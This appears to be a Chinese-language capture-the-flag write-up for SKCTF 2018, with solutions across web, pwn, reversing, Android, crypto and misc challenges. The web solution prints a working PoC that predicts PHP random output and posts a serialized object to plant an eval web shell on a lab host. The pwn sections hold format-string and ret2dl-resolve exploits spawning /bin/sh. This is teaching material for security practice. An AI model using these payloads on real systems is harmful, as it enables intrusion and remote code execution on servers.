+<p>重写str_shuffle的底层代码，这里需要注意到底什么时候传入多少个rand()值，poc如下</p>
+<pre><code>#encoding: utf-8
+import requests
+import re
+import random
+from ctypes import *
+
+def RAND_RANGE(__n,__min,__max,__tmax):
+    xx =  __min + ( ( (__max) - (__min) + 1.0) * ((__n) / ((__tmax) + 1.0)))
+    return (int)(xx)
+
+def str_shuffle(arr,ss):
+    n_elems = len(ss)
+    if(n_elems&lt;=1):
+        return
+    num = -1
+    kk = []
+    brr = []
+    for m in range(32,32+n_elems+1):
+        num = num+1
+        arr.append((arr[m-3]+arr[m-31])%2147483647)
+        brr.append(arr[num])
+
+    n_left = n_elems
+    n = -1
+    n_left = n_left-1
+    sss = []
+    for s in ss:
+        sss.append(s)
+    x = 0
+    while (n_left):
+
+        n = n+1
+        rnd_idx = brr[n]
+        rnd_idx = RAND_RANGE(rnd_idx,0,n_left,2147483647)
+
+        if(rnd_idx!=n_left):
+            sss[rnd_idx],sss[n_left] = sss[n_left],sss[rnd_idx]
+        n_left = n_left-1
+        x = x + 1
+    return sss
+
+ars = []
+headers=&#123;
+        &#39;Connection&#39;: &#39;Keep-Alive&#39;
+&#125;
+s = requests.Session()
+url=&#39;http://192.168.190.128:1112/index.php&#39;
+for i in range(32):
+    r =s.get(url=url,headers=headers)
+    ars.append(int(r.text))
+#print ars
+payload = []
+for i in range(73):
+    ars.append((ars[i+1]+ars[i+29])%2147483647)
+sss = str_shuffle(ars[33:65],&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;)
+key = &#39;&#39;.join(sss)
+print &quot;key:&quot;+key
+sss1 = str_shuffle(ars[68:],&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;)
+key1 = &#39;&#39;.join(sss1)
+print &quot;key1:&quot;+key1
+data = &#123;
+    &quot;up_addr&quot;:key,
+    &quot;str&quot;:&#39;|O:5:&quot;SKCTF&quot;:1:&#123;s:7:&quot;content&quot;;s:25:&quot;&lt;?php eval($_POST[1]); ?&gt;&quot;;&#125;&#39;
+&#125;
+print data
+r=s.post(url,headers=headers,data=data)
+print(r.text)
+url_new = &quot;http://192.168.190.128:1112/kkkk.php&quot;
+print s.get(url=url_new).content
+</code></pre>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>简单的大数字格式化字符串</p>
+<pre><code class="python"># coding=utf-8
+from pwn import *
+
+p = process(&#39;./pwn1&#39;)
+
+payload = fmtstr_payload(7, &#123;0x0804a028: 0x12345678&#125;)
+
+p.sendline(payload)
+
+p.interactive()</code></pre>
+<h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>明显的栈溢出，很直观的漏洞在read函数，但是只有一个read，没有可以用来leak的函数，所以用Return-to-dl-resolve的解法   </p>
+<ol>
+<li>首先在bss段写入/bin/sh   </li>
+<li>调用system函数</li>
+</ol>
+<pre><code class="python">#coding:utf-8
+import sys
+import roputils
+from pwn import *
+
+
+p = process(&#39;./pwn2&#39;)
+elf = ELF(&#39;pwn2&#39;)
+
+readplt = elf.plt[&#39;read&#39;]
+#print hex(readplt)
+
+
+#readplt = 0x8048310
+bss = 0x0804A024 
+vulFun = 0x0804844D
+offset = 40
+
+rop = roputils.ROP(&#39;./pwn2&#39;)
+bss_addr = rop.section(&#39;.bss&#39;)
+
+buf1 = &#39;A&#39; * offset
+buf1 += p32(readplt) + p32(vulFun) + p32(0) + p32(bss_addr) + p32(100)
+
+p.send(buf1)
+
+buf2 =  rop.string(&#39;/bin/sh&#39;)
+buf2 += rop.fill(20, buf2)
+buf2 += rop.dl_resolve_data(bss_addr+20, &#39;system&#39;)
+buf2 += rop.fill(100, buf2)
+p.send(buf2)
+
+buf3 = &#39;A&#39;* offset + rop.dl_resolve_call(bss_addr+20, bss_addr)
+p.send(buf3)
+p.interactive()</code></pre>
+<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="BabyRE"><a href="#BabyRE" class="headerlink" title="BabyRE"></a>BabyRE</h2><p>使用gdb进行调试分析</p>
+<pre><code>gdb-peda$ b main.main
+Breakpoint 1 at 0x48ea30: file /root/Desktop/babyre.go, line 7.
+gdb-peda$ disas main.main
+Dump of assembler code for function main.main:
+   0x000000000048ea30 &lt;+0&gt;: mov    rcx,QWORD PTR fs:0xfffffffffffffff8
+   0x000000000048ea39 &lt;+9&gt;: lea    rax,[rsp-0x8]
+   0x000000000048ea3e &lt;+14&gt;:    cmp    rax,QWORD PTR [rcx+0x10]
+   0x000000000048ea42 &lt;+18&gt;:    jbe    0x48ebda &lt;main.main+426&gt;
+   0x000000000048ea48 &lt;+24&gt;:    sub    rsp,0x88
+   0x000000000048ea4f &lt;+31&gt;:    mov    QWORD PTR [rsp+0x80],rbp
+   0x000000000048ea57 &lt;+39&gt;:    lea    rbp,[rsp+0x80]
+   0x000000000048ea5f &lt;+47&gt;:    lea    rax,[rip+0x1087a]        # 0x49f2e0
+   0x000000000048ea66 &lt;+54&gt;:    mov    QWORD PTR [rsp],rax
+   0x000000000048ea6a &lt;+58&gt;:    call   0x40e470 &lt;runtime.newobject&gt;
+   0x000000000048ea6f &lt;+63&gt;:    mov    rax,QWORD PTR [rsp+0x8]
+   0x000000000048ea74 &lt;+68&gt;:    mov    QWORD PTR [rsp+0x48],rax
+   0x000000000048ea79 &lt;+73&gt;:    mov    ecx,0x1
+   0x000000000048ea7e &lt;+78&gt;:    jmp    0x48eb09 &lt;main.main+217&gt;
+   0x000000000048ea83 &lt;+83&gt;:    inc    rcx
+   0x000000000048ea86 &lt;+86&gt;:    cmp    rcx,0xf
+   0x000000000048ea8a &lt;+90&gt;:    jge    0x48ebb9 &lt;main.main+393&gt;
+   0x000000000048ea90 &lt;+96&gt;:    mov    rdx,QWORD PTR [rax+0x8]
+   0x000000000048ea94 &lt;+100&gt;:   mov    rbx,QWORD PTR [rax]
+   0x000000000048ea97 &lt;+103&gt;:   cmp    rcx,rdx
+   0x000000000048ea9a &lt;+106&gt;:   jae    0x48ebd3 &lt;main.main+419&gt;
+   0x000000000048eaa0 &lt;+112&gt;:   movzx  edx,BYTE PTR [rbx+rcx*1]
+   0x000000000048eaa4 &lt;+116&gt;:   lea    rbx,[rip+0x324b8]        # 0x4c0f63
+   0x000000000048eaab &lt;+123&gt;:   movzx  esi,BYTE PTR [rbx+rcx*1]
+   0x000000000048eaaf &lt;+127&gt;:   xor    edx,esi
+   0x000000000048eab1 &lt;+129&gt;:   cmp    dl,0x3
+   0x000000000048eab4 &lt;+132&gt;:   jne    0x48eb6f &lt;main.main+319&gt;
+   0x000000000048eaba &lt;+138&gt;:   cmp    rcx,0xe
+   0x000000000048eabe &lt;+142&gt;:   jne    0x48ea83 &lt;main.main+83&gt;
+   0x000000000048eac0 &lt;+144&gt;:   xorps  xmm0,xmm0
+   0x000000000048eac3 &lt;+147&gt;:   movups XMMWORD PTR [rsp+0x50],xmm0
+   0x000000000048eac8 &lt;+152&gt;:   lea    rax,[rip+0x10811]        # 0x49f2e0
+   0x000000000048eacf &lt;+159&gt;:   mov    QWORD PTR [rsp+0x50],rax
+   0x000000000048ead4 &lt;+164&gt;:   lea    rcx,[rip+0x42df5]        # 0x4d18d0 &lt;main.statictmp_1&gt;
+   0x000000000048eadb &lt;+171&gt;:   mov    QWORD PTR [rsp+0x58],rcx
+   0x000000000048eae0 &lt;+176&gt;:   lea    rdx,[rsp+0x50]
+   0x000000000048eae5 &lt;+181&gt;:   mov    QWORD PTR [rsp],rdx
+   0x000000000048eae9 &lt;+185&gt;:   mov    QWORD PTR [rsp+0x8],0x1
+   0x000000000048eaf2 &lt;+194&gt;:   mov    QWORD PTR [rsp+0x10],0x1
+   0x000000000048eafb &lt;+203&gt;:   call   0x4831a0 &lt;fmt.Println&gt;
+   0x000000000048eb00 &lt;+208&gt;:   xor    eax,eax
+   0x000000000048eb02 &lt;+210&gt;:   mov    ecx,eax
+   0x000000000048eb04 &lt;+212&gt;:   mov    rax,QWORD PTR [rsp+0x48]
+   0x000000000048eb09 &lt;+217&gt;:   test   cl,cl
+   0x000000000048eb0b &lt;+219&gt;:   je     0x48ebc3 &lt;main.main+403&gt;
+   0x000000000048eb11 &lt;+225&gt;:   mov    BYTE PTR [rsp+0x47],cl
+   0x000000000048eb15 &lt;+229&gt;:   xorps  xmm0,xmm0
+   0x000000000048eb18 &lt;+232&gt;:   movups XMMWORD PTR [rsp+0x70],xmm0
+   0x000000000048eb1d &lt;+237&gt;:   lea    rcx,[rip+0xda1c]        # 0x49c540
+   0x000000000048eb24 &lt;+244&gt;:   mov    QWORD PTR [rsp+0x70],rcx
+   0x000000000048eb29 &lt;+249&gt;:   mov    QWORD PTR [rsp+0x78],rax
+   0x000000000048eb2e &lt;+254&gt;:   lea    rdx,[rip+0x30dc8]        # 0x4bf8fd
+   0x000000000048eb35 &lt;+261&gt;:   mov    QWORD PTR [rsp],rdx
+   0x000000000048eb39 &lt;+265&gt;:   mov    QWORD PTR [rsp+0x8],0x2
+   0x000000000048eb42 &lt;+274&gt;:   lea    rbx,[rsp+0x70]
+   0x000000000048eb47 &lt;+279&gt;:   mov    QWORD PTR [rsp+0x10],rbx
+   0x000000000048eb4c &lt;+284&gt;:   mov    QWORD PTR [rsp+0x18],0x1
+   0x000000000048eb55 &lt;+293&gt;:   mov    QWORD PTR [rsp+0x20],0x1
+   0x000000000048eb5e &lt;+302&gt;:   call   0x489180 &lt;fmt.Scanf&gt;
+   0x000000000048eb63 &lt;+307&gt;:   mov    rax,QWORD PTR [rsp+0x48]
+   0x000000000048eb68 &lt;+312&gt;:   xor    ecx,ecx
+   0x000000000048eb6a &lt;+314&gt;:   jmp    0x48ea86 &lt;main.main+86&gt;
+   0x000000000048eb6f &lt;+319&gt;:   xorps  xmm0,xmm0
+   0x000000000048eb72 &lt;+322&gt;:   movups XMMWORD PTR [rsp+0x60],xmm0
+   0x000000000048eb77 &lt;+327&gt;:   lea    rax,[rip+0x10762]        # 0x49f2e0
+   0x000000000048eb7e &lt;+334&gt;:   mov    QWORD PTR [rsp+0x60],rax
+   0x000000000048eb83 &lt;+339&gt;:   lea    rcx,[rip+0x42d36]        # 0x4d18c0 &lt;main.statictmp_0&gt;
+   0x000000000048eb8a &lt;+346&gt;:   mov    QWORD PTR [rsp+0x68],rcx
+   0x000000000048eb8f &lt;+351&gt;:   lea    rdx,[rsp+0x60]
+   0x000000000048eb94 &lt;+356&gt;:   mov    QWORD PTR [rsp],rdx
+   0x000000000048eb98 &lt;+360&gt;:   mov    QWORD PTR [rsp+0x8],0x1
+   0x000000000048eba1 &lt;+369&gt;:   mov    QWORD PTR [rsp+0x10],0x1
+   0x000000000048ebaa &lt;+378&gt;:   call   0x4831a0 &lt;fmt.Println&gt;
+   0x000000000048ebaf &lt;+383&gt;:   movzx  eax,BYTE PTR [rsp+0x47]
+   0x000000000048ebb4 &lt;+388&gt;:   jmp    0x48eb02 &lt;main.main+210&gt;
+   0x000000000048ebb9 &lt;+393&gt;:   movzx  eax,BYTE PTR [rsp+0x47]
+   0x000000000048ebbe &lt;+398&gt;:   jmp    0x48eb02 &lt;main.main+210&gt;
+   0x000000000048ebc3 &lt;+403&gt;:   mov    rbp,QWORD PTR [rsp+0x80]
+   0x000000000048ebcb &lt;+411&gt;:   add    rsp,0x88
+   0x000000000048ebd2 &lt;+418&gt;:   ret    
+   0x000000000048ebd3 &lt;+419&gt;:   call   0x424f70 &lt;runtime.panicindex&gt;
+   0x000000000048ebd8 &lt;+424&gt;:   ud2    
+   0x000000000048ebda &lt;+426&gt;:   call   0x44d270 &lt;runtime.morestack_noctxt&gt;
+   0x000000000048ebdf &lt;+431&gt;:   jmp    0x48ea30 &lt;main.main&gt;
+End of assembler dump.
+
+</code></pre>
+<p>73行一层while循环, 然后跳到217行, 若符合while条件, 向下执行到302行调用Scanf函数，然后再跳回86行, 进入一个i = 0; i &lt; 15的循环, 在116行加载一个字符串[0x4c0f63]<code>PH@WExabazd3qf~</code>(使用 x /s 0x4c0f63查看), 然后进行逐位异或, 若异或结<br>果不为1, 则跳出循环Printf(“Wrong”), 否则继续循环, 直到循环结束输出Printf(“Right”)</p>
+<p>源码:</p>
+<pre><code class="golang">package main
+
+import (
+&quot;fmt&quot;
+)
+
+func main() &#123;
+    var i = true
+    str := &quot;&quot;
+    str2 := &quot;PH@WExabazd3qf~&quot;
+    for i &#123;
+        fmt.Scanf(&quot;%s&quot;, &amp;str)
+        for b:=0; b &lt; 15; b++ &#123;
+            if str[b] ^ str2[b] != 3 &#123;
+                fmt.Println(&quot;Wrong&quot;)
+                break
+            &#125; else &#123;
+                if b == 14 &#123;
+                    fmt.Println(&quot;Right&quot;)
+                    i = !true
+                    break
+                &#125;
+            &#125;
+        &#125;
+    &#125;
+&#125;</code></pre>
+<h2 id="intel"><a href="#intel" class="headerlink" title="intel"></a>intel</h2><p>虽然是mac程序，但是ida也能分析<br>直接上脚本</p>
+<pre><code>def calc(result):
+    for i in range(32,128):
+        k = i
+        for j in range(4):
+            tmp = k*2
+            if tmp &amp; 0x100:
+                tmp |= 1
+            k = tmp &amp; 255
+        if k == result:
+            return chr(i)
+string=&#39;44F6F557F5C696B656F51425D4F596E63747275736479603E6F3A392&#39;.decode(&#39;hex&#39;)
+flag = &#39;&#39;
+for ch in string:
+    flag+=calc(ord(ch))
+
+print f_d</code></pre>
+<h2 id="getit"><a href="#getit" class="headerlink" title="getit"></a>getit</h2><p>一个exe文件，查壳<br><img src="http://oymyxu3ku.bkt.clouddn.com/TIM%E5%9B%BE%E7%89%8720180510184251.png" alt="image"><br>用IDA打开，F12查看字符串，发现几个关键句<br><img src="http://oymyxu3ku.bkt.clouddn.com/TIM%E6%88%AA%E5%9B%BE20180510184507.jpg" alt="image"><br>双击进入到具体位置<br><img src="http://oymyxu3ku.bkt.clouddn.com/TIM%E6%88%AA%E5%9B%BE20180510184601.jpg" alt="image"><br>在函数名上按X，寻找到函数的具体位置，F5查看伪代码<br><img src="http://oymyxu3ku.bkt.clouddn.com/TIM%E6%88%AA%E5%9B%BE20180510184601.jpg" alt="image"><br>分析一下语境，发现与“U7kD0VwFt2d0DUUfVxdQEMl=ZVd=”这串字符串有关，既然和flag接近，那就是该字符串经过某些转换才能得到flag<br>观察该字符串，猜测与密码有关，看到两个等号联想到base64，但是格式又不像，猜测栅栏密码，解密得到flag。</p>
+<p>-&gt; 栅栏密码</p>
+<p><code>U0tDVEZ7V2UxMVkwdUdldDF0fQ==</code></p>
+<p>-&gt;base64 decode</p>
+<p><code>SKCTF&#123;We11Y0uGet1t&#125;</code></p>
+<h1 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h1><h2 id="爆破大法好"><a href="#爆破大法好" class="headerlink" title="爆破大法好"></a>爆破大法好</h2><p>见名知意，本题就是采用爆破的方法得到flag.</p>
+<p><img src="/images/SKCTF2018/android1.png" alt="android1"></p>
+<p>关键代码如上，可以看到程序首先查看输入的字符串的长度是否为6，然后将输入进行MD5加密，将加密后的结果与result进行比较。</p>
+<p>因为采用的MD5加密，所以无法直接解密，采用爆破的方法得到flag。</p>
+<p>Flag为skctf{soeasy}</p>
+<h2 id="getFlag"><a href="#getFlag" class="headerlink" title="getFlag"></a>getFlag</h2><p>程序打开后为一个网页，然后通过点击网页链接调用encrypt类，</p>
+<p><img src="/images/SKCTF2018/android2.png" alt="android"></p>
+<p>将输入每四位进行循环左移，input[0,1,2,3,4,5,6…]变为input[1,2,3,0,5,6,7,4…]</p>
+<p><img src="/images/SKCTF2018/android3.png" alt="android"></p>
+<p>获取程序的签名值，这地方为了降低难度，打开了Log，不知道这是获取签名也可以做，查看一下log即可得到签名值。</p>
+<p><img src="/images/SKCTF2018/android4.png" alt="android"></p>
+<p>将上面左移后的结果与签名的偶数位进行异或得到v5，最后将v5与result进行比较。</p>
+<p>反推一下算法过程即可得到flag。Flag为skctf{congratulation!!}</p>
+<p>脚本如下：</p>
+<pre><code class="python">end = [13, 92, 5, 87, 81, 22, 65, 22, 89, 70, 94, 8, 91, 67, 64, 90]
+s = &quot;B026B34B00BB4CD2862175D157B1AD5EE89A407C&quot;
+ss =&quot;b026b34b00bb4cd2862175d157b1ad5ee89a407c&quot;
+flag =&quot;&quot;
+for i in range(0,16):
+    flag += (chr(int(end[i]) ^ ord(ss[i*2])))
+print(flag)
+flag = list(flag)
+for i in range(0,4):
+    c = flag[(3-i)*4+3]
+
+    for j in range(0,3):
+        flag[(3-i) * 4 + (2-j) + 1] = flag[(3-i) * 4 + (2-j)]
+    flag[(3-i) * 4] = c
+    print(flag)
+for i in range(0,16):
+    print(flag[i],end=&quot;&quot;)
+#congratulation!!
+</code></pre>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="LFSR"><a href="#LFSR" class="headerlink" title="LFSR"></a>LFSR</h2><p>根据图可知，Y是LFSR产生序列与FLAG异或得到的结果，已知Y，只要生成加密时使用的序列即可得到flag。<br>已知LFSR初始状态为17，即10001。则根据LFSR原理，将其表示为a1,a2,a3,a4,a5。首先输出的是a1，即LFSR右端为a1，顺序向左排列。<br>第一次运算，移位输出a1，将a1与a4进行异或运算得到a6：<br><code>a6 = a1 ^ a4</code><br>第一次运算后，LFSR中由右至左为 11000，重复操作，继续输出。<br>推广：</p>
+<pre><code>n&gt;5时，a(n) = a(n-5) ^ a(n-2)</code></pre>
+<p>又知Y长度为184，则依次运算生成184位初始序列：</p>
+<pre><code>1101110011010001000000011110111101011001010011111100000101000110011000010011000001100101101110010010001110011001011110111110100010001110111110110110011111010111110001100001101000101010</code></pre>
+<p>将其与Y进行异或即可得到FLAG的二进制，转为16进制后，再转换为字符即可。</p>
+<pre><code>flag：SKCTF&#123;D0_YoU_Kn0w_Lf5R&#125;</code></pre>
+<pre><code class="python">
+# - UTF-8 -
+# LSFR_decode
+# _Bonjour
+# 
+
+Y = &quot;1101110011010001000000011110111101011001010011111100000101000110011000010011000001100101101110010010001110011001011110111110100010001110111110110110011111010111110001100001101000101010&quot;
+len = len(Y)
+print(len) # 求密文长度
+
+# initial_state = 17
+# initial_state = &quot;00010001&quot;
+output = &#39;10001&#39;
+
+# 根据图(a4,a3,a2,a1,a0)，f = list[i] ^ list[i + 3]
+for i in range(184):
+    output += str(int(output[i]) ^ int(output[i + 3]))
+print(&quot;output = &quot; + output)
+
+flag = &#39;&#39;
+for i in range(184):
+    flag += str(int(output[i]) ^ int(Y[i]))
+print(&quot;flag = &quot; + flag)
+
+list = &#39;&#39;
+idx = 0
+while idx &lt; len:
+    list += chr(int(flag[idx:idx+8],2))
+    idx += 8
+print(list)
+</code></pre>
+<h2 id="easy-rsa"><a href="#easy-rsa" class="headerlink" title="easy rsa"></a>easy rsa</h2><p>低指数幂爆破攻击，脚本如下</p>
+<pre><code>import libnum
+
+c=20007698782339834246219328724588364459038474898597431254441716723329047692482286669616878491497181438826429104573158490197780427343059002311390665150204203593904674308567972583524863664412573864470357485299378319457792659062998310715680020892095430469672971488726545126438904961637
+n= 127736277372703302601056543119422673263688414162130452012271136376613506149677023810059879551077756689012265602068781726322860263396788055341495459092641851239465778777954763378423777055786390661741851297248439205933852145044703803764388021585419049988085302710871206091591995497858682344782684500134395300049
+
+
+for e in range(2,10):
+    m = libnum.nroot(c,e)
+    if m**e==c:
+        break
+
+print &quot;e:&quot;,e
+print &quot;m:&quot;,m
+flag = libnum.n2s(m)
+print flag</code></pre>
+<h2 id="看到的就是全部"><a href="#看到的就是全部" class="headerlink" title="看到的就是全部"></a>看到的就是全部</h2><p>相关知识：caser + 栅栏 + unicode </p>
+<p>cipher: </p>
+<pre><code class="Unicode">\u4f\u50\u53\u79\u41\u47\u42\u7a\u47\u42\u61\u4b\u32\u59\u33\u7d\u59\u7b\u31\u69\u6f\u50\u6e</code></pre>
+<p>unicode decode</p>
+<p>栅栏 key:3</p>
+<p>凯撒caser</p>
+<p>plain: SKCTF{We1cOmE2sKCTF3rd}</p>
+<h2 id="FairPlay"><a href="#FairPlay" class="headerlink" title="FairPlay"></a>FairPlay</h2><p>相关知识：fairplay加密<br>参考原理：<br><a href="https://blog.csdn.net/qq_25968195/article/details/70343910" target="_blank" rel="noopener">https://blog.csdn.net/qq_25968195/article/details/70343910</a><br>具体加密步骤：</p>
+<ul>
+<li><p>根据key构建5*5矩阵<br>j   u   s   t   d<br>o   a   b   c   e<br>f   g   h   k   l<br>m   n   p   q   r<br>v   w   x   y   z</p>
+</li>
+<li><p>对密文进行两两分组<br>（** 若两元素相同（a == b）：于两元素间插入x<br>** 若两元素同一行(a / 5 == b / 5)：取右（+1）元素<br>** 若两元素同一列(a % 5 == b % 5)：取下（+5）元素<br>** 若两元素不同行不同列：以两元素为对角线构建矩阵，分别取该矩阵内的同行（a + (|b - a| % 5) 和 b - (|b - a| % 5)）元素）</p>
+</li>
+</ul>
+<pre><code class="python">  # Playfair_encode
+  # 
+  # 本代码已知约定：
+    # j -&gt; i
+    # 若 p1=p2，则插入一个字母(X)于重复字母之间；
+    # 若明文字母数为奇数时，则在明文的末端添加(Z)作为填充；
+    # 
+  # Bonjour_
+
+  # 移除密钥中已存在的字符
+  def Remove(key):
+    key = key.lower() # 将所有大写字母转为小写
+    text = &#39;&#39;
+    for c in key:
+      if c == &#39;i&#39;:
+        c = &#39;j&#39;
+      if c in text:
+        continue
+      else:
+        text+=c
+    return text
+
+  # 整合密钥不重复字母和字母表剩余字母
+  def Ordertext(text):
+    Alphabet = &quot;abcdefghijklmnopqrstuvwxyz&quot;
+    for c in Alphabet:
+      if c == &#39;i&#39;:
+        c = &#39;j&#39;
+      if c not in text:
+        text+=c
+    return text
+
+  # 根据已确定顺序构造5*5矩阵
+  def CreatMatrix(text):
+    Matrix = []
+    cnt = 0
+    for i in range(25):
+      Matrix.append(text[cnt:cnt+1])
+      cnt+=1
+    return Matrix
+
+  # 查找指定元素
+  def Search(Matrix,c):
+    if c == &#39;i&#39;:
+      c = &#39;j&#39;
+    cnt = 0
+    for i in Matrix:
+      if i == c:
+        # print(cnt)
+        return cnt # 返回元素位置
+      cnt = cnt + 1
+    return -1
+
+  def Abs(a,b):
+    if a &gt; b:
+      return a - b
+    else:
+      return b - a
+
+  # 进行元素变化 ##&#39;A&#39; = 65, &#39;a&#39; = 97
+  # # 若两元素同一行(a / 5 == b / 5)：取右（+1）元素
+  def Change1(Matrix,x):
+    if int(x / 5) != int((x + 1) / 5):
+      x = int(int(x / 5) * 5)
+      # print(x)
+    else:
+      x = x + 1
+    # print(&quot;+1+&quot;)
+    return Matrix[x]
+
+  # 若两元素同一列(a % 5 == b % 5)：取下（+5）元素
+  def Change2(Matrix,x):
+    x = (x + 5) % 25
+    return Matrix[x]
+
+  # 若两元素不同行不同列：以两元素为对角线构建矩阵，分别取该矩阵内的同行（a + (|b - a| % 5) 和 b - (|b - a| % 5)）元素
+  def Change3(Matrix,x,diff):
+    x = x + diff
+    return Matrix[x]
+
+
+  # 两两分组
+  # 若两元素相同（a == b）：于两元素间插入x
+  # 若两元素同一行(a / 5 == b / 5)：取右（+1）元素
+  # 若两元素同一列(a % 5 == b % 5)：取下（+5）元素
+  # 若两元素不同行不同列：以两元素为对角线构建矩阵，分别取该矩阵内的同行（a + (|b - a| % 5) 和 b - (|b - a| % 5)）元素
+  def encode(Matrix,plain,len):
+    cnt = 0
+    text = &#39;&#39;
+    while(cnt &lt; len):
+      a = plain[cnt]
+      b = plain[cnt + 1]
+      pos_a = Search(Matrix,a)
+      pos_b = Search(Matrix,b)
+      # print(int(pos_a / 5))
+      # print(int(pos_b / 5))
+      # c = &#39;a&#39;
+      # c = ord(c) + 1 //ord()：将字符转化为整数值
+      # print(chr(c)) //输出&#39;b&#39;
+      if pos_a == pos_b:
+        text += a
+        text += &#39;x&#39;
+        text += a
+      elif int(pos_a / 5) == int(pos_b / 5):
+        text += Change1(Matrix,pos_a)
+        text += Change1(Matrix,pos_b)
+      elif pos_a % 5 == pos_b % 5:
+        text += Change2(Matrix,pos_a)
+        text += Change2(Matrix,pos_b)
+      # 根据两种矩阵格式区分
+      elif pos_a % 5 &lt; pos_b % 5:
+        diff = pos_b % 5 - pos_a % 5
+        if pos_a &gt; pos_b:
+          text += Change3(Matrix,pos_a,diff)
+          text += Change3(Matrix,pos_b,-diff)
+        else:
+          text += Change3(Matrix,pos_a,diff)
+          text += Change3(Matrix,pos_b,-diff)
+      elif pos_a % 5 &gt; pos_b % 5:
+        diff = pos_a % 5 - pos_b % 5
+        if pos_a &gt; pos_b:
+          text += Change3(Matrix,pos_a,-diff)
+          text += Change3(Matrix,pos_b,diff)
+        else:
+          text += Change3(Matrix,pos_a,-diff)
+          text += Change3(Matrix,pos_b,diff)
+      cnt+=2
+    return text
+
+
+  # 读取文件
+  input = open(&#39;in.txt&#39;)
+  try:
+    plain = input.read()
+  finally:
+    input.close()
+
+  print(plain)
+
+  file = open(&#39;key.txt&#39;)
+  try:
+    key = file.read()
+  finally:
+    file.close()
+  # 去除空格
+  # key=key.replace(&#39; &#39;,&#39;&#39;) 
+
+  text = Remove(key)
+  text = Ordertext(text)
+  Matrix = CreatMatrix(text)
+  print(Matrix)
+  # print(Matrix[0])
+
+  # 若明文字母数为奇数时，则在明文的末端添加(Z)作为填充；
+  len = 0
+  for i in plain:
+    len = len + 1
+  if len % 2 == 1:
+    plain += &#39;z&#39;
+
+  cipher = encode(Matrix,plain,len)
+  print(cipher)
+
+
+  #flag:SKCTF&#123;rhcwgodmdbordbbutcgbmasklzdx&#125;</code></pre>
+<h2 id="仿射变换"><a href="#仿射变换" class="headerlink" title="仿射变换"></a>仿射变换</h2><p>相关知识：仿射加密<br>参考原理：百度百科-仿射加密<br>m = 11x + 23(mod 26)<br>求得11模26的逆为19，因此c = 19(m - 23)(mod 26)</p>
+<pre><code class="python">c = &#39;fwpcpywpcphnxaoxlywpcphnxlhco&#39;
+
+def getGcd(x,y):
+  while True:
+    divisor = x % y
+    gcd = y
+    x,y = y,divisor
+    if divisor == 0:
+      break
+  return gcd
+
+def setCoprime(a,n):
+  for i in range(1,n):
+    #print(getGcd(n,i))
+    if(1 == getGcd(n,i)): 
+      a.append(i)
+
+def get_a(l,a,n):
+  for i in l:
+    if(1 == a * i % n):
+      return i
+  return 0
+
+def decrypt(s,a,b,n):
+  c = &#39;&#39;
+  s.split()
+  l = []
+  setCoprime(l,n)
+  #print(l)
+  #print(get_a(l,a,n))
+  for i in s:
+    c += chr(((get_a(l,a,n) * ((ord(i)-97) - b)) % 26)+97)
+  return c
+
+print(decrypt(c,11,23,26))
+
+#flag:SKCTF&#123;wherethereisaflagthereisagirl&#125;</code></pre>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Just-Listen"><a href="#Just-Listen" class="headerlink" title="Just Listen"></a>Just Listen</h2><p>解压压缩包得到图片和mp3。</p>
+<p>password.jpg藏着密码，用stegsolve打开，切换通道，得到密码。</p>
+<p><img src="/images/SKCTF2018/listen1.png"></p>
+<p><code>key&#123;forensics_is_fun&#125;</code></p>
+<p>Mp3stego工具可以将信息隐藏到MP3中，并需用密钥解密。</p>
+<p>Mp3stego工具：<a href="http://www.petitcolas.net/steganography/mp3stego/" target="_blank" rel="noopener">http://www.petitcolas.net/steganography/mp3stego/</a></p>
+<p>直接用工具解密得到flag。</p>
+<p><img src="/images/SKCTF2018/listen2.png"></p>
+<h2 id="真香"><a href="#真香" class="headerlink" title="真香"></a>真香</h2><p>下载zhenxiang.gif，放到binwalk中分析，发现有zip文件。</p>
+<p><img src="/images/SKCTF2018/xiang1.png"></p>
+<p><code>-e</code>参数提取出来。</p>
+<p><img src="/images/SKCTF2018/xiang2.png"></p>
+<p>得到一个加密的压缩包，注释<code>blind_water_mark</code>是压缩包密码。</p>
+<p>解压得到<code>or.png</code>和<code>xor.png</code>两张图片。</p>
+<p>注释同时也是提示，两张图片用盲水印攻击即可getflag。</p>
+<p>BlindWaterMark工具:<a href="https://github.com/chishaxie/BlindWaterMark" target="_blank" rel="noopener">https://github.com/chishaxie/BlindWaterMark</a></p>
+<p><img src="/images/SKCTF2018/xiang3.png"></p>
+<p>flag:</p>
+<p><img src="/images/SKCTF2018/xiangflag.png"></p>
+<h2 id="找到了也打不开"><a href="#找到了也打不开" class="headerlink" title="找到了也打不开"></a>找到了也打不开</h2><hr>
+<p>题目是一个pcap的数据包，打开后发现数据包里的数据有很多，但是http的只有一条，查看这条http数据包，发</p>
+<p>现数据内容为一个.zip的压缩包，那思路就很简单了，把这个zip文件里的内容提取出来，保存为一个压缩包文件，</p>
+<p>但是解压需要密码，没有任何提示的情况下爆破是不可能的，用winhex或者UE等软件查看下十六进制文件，发现</p>
+<p>是zip的伪加密，修改下zip的加密标志即可打开压缩包得到Flag。</p>
+<h2 id="I-wanna-get-the-flag"><a href="#I-wanna-get-the-flag" class="headerlink" title="I_wanna_get_the_flag"></a>I_wanna_get_the_flag</h2><p>GameMarker 8.0制作的I wanna 游戏。(原名：I wanna be the GGM)</p>
+<p>描述通关之后有flag。</p>
+<p>3种解题方法</p>
+<h3 id="1-通关游戏"><a href="#1-通关游戏" class="headerlink" title="1-通关游戏"></a>1-通关游戏</h3><p>既然是通关之后，那么凭技术通关也是没问题的。</p>
+<h3 id="2-修改save文件。"><a href="#2-修改save文件。" class="headerlink" title="2-修改save文件。"></a>2-修改save文件。</h3><p>通过存档，玩游戏搞清save文件的格式，用16进制编辑。<br><img src="/images/SKCTF2018/iwanna.png"></p>
+<p>标出的两位就是关卡的标志，题目说有12关，那么，把<code>0112</code>修改为<code>011E</code>，再进入游戏就可以得到flag。</p>
